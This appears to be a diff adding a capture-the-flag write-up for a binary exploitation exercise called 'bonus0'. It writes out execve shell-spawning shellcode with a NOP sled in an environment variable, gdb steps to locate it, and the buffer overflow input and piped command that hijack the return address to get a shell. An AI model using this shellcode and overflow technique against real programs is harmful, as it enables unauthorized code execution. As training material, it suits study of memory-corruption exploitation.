@@ -1,0 +1,20 @@
+export SHELLCODE:
+  export SHELLCODE=$(python -c 'print "\x90" * 1024 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+
+find middle of nospled of shellcode env variable in program:
+  gdb ./bonus0
+  start
+  p/x getenv("SHELLCODE") = adress_start
+  p/x adress_start + 0x200 = middle
+
+overflow first buffer by writing at least 20 char + '\n'
+ python -c 'print "A" * 20'
+
+9: smash first and second buffer in gdb search for 2nd pattern: start at +9 (AAAABBBBC) then addr(CCCD)
+write 9 char then adress_middle for IEP override then fill buffer to overflow main buffer at least 7
+ python -c 'print "B" * 9 + 4 bytes of adress_middle + "C" * 7'
+
+ combine with cat command to let stdin open
+  (python -c 'print "A" * 20';  python -c 'print "B" * 9 + 4 bytes of adress_middle + "C" * 7'; cat) | ./bonus0
+
+  (python -c 'print "A" * 20';  python -c 'print "B" * 9 + 4 bytes of adress_middle + "C" * 7'; cat) | ./bonus0
